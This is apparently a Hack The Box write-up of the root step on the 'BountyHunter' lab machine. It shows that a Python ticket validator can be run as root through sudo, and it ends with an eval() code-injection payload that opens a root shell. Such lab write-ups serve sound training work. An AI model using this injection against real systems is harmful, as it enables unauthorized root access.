# root
## ```sudo -l```


![](BountyHunter.HTB-11.png)

````bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
````

- we begin with the obligatory ```sudo -l``` for linux boxes on Hack The Box
- a script  ```/opt/skytrain_inc/ticketValidator.py``` can be run as root

## ```ticketValidator.py```

![](BountyHunter.HTB-12.png)
- ticket is any filename that ends with .md extension
- within the .md file there are lines that must appear in a specific format
- lines 16 to 25 say the .md file should read as follows

````bash
# Skytrain Inc
## Ticket to 
__Ticket Code:__
````


![](BountyHunter.HTB-13.png)
- line 30 - 35 define what the final line should look like. It is also the line where we inject the payload to get root.
- line 32 says the code we are looking for is the code that remains when<br>
[+] first the string ``**``is removed. 
[+] We are left with a <b>code</b> that has plus in it because the split function uses the ``+`` as a separator between two things
- we know that <b>code</b> must be a number because a divisor is applied to it to get a remainder of 4; according to line 33
- The vulnerable ``eval()`` code appears on line 34<br>[+] when the replace function is applied, all that is left is the ticket code and a plus sign
[+] all that remains is the injection of python code so that the code being executed is ``eval(109+__import__('os').system('sudo bash'))``

![](BountyHunter.HTB-14.gif)